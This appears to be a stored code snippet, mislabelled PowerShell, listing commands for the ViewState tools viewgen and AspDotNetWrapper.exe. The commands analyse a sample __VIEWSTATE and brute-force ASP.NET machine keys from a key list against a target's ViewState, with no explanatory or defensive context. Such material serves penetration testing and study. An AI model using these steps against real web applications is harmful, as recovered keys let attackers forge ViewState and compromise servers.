---
id: ba2138b7-7d97-4161-a11e-faa3e86547f2
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:55:52.536842+00:00'
updated_at: '2023-04-06T03:55:52.543551+00:00'
---

# Code Snippet ba2138b7

**Language**: Powershell

```powershell
# --webconfig WEBCONFIG: automatically load keys and algorithms from a web.config file
# -m MODIFIER, --modifier MODIFIER: VIEWSTATEGENERATOR value
$ viewgen --guess "/wEPDwUKMTYyODkyNTEzMw9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkuVmqYhhtcnJl6Nfet5ERqNHMADI="
[+] ViewState is not encrypted
[+] Signature algorithm: SHA1

# --encrypteddata : __VIEWSTATE parameter value of the target application
# --modifier : __VIEWSTATEGENERATOR parameter value
$ AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <real viewstate value> --purpose=viewstate --modifier=<modifier value> –macdecode
```
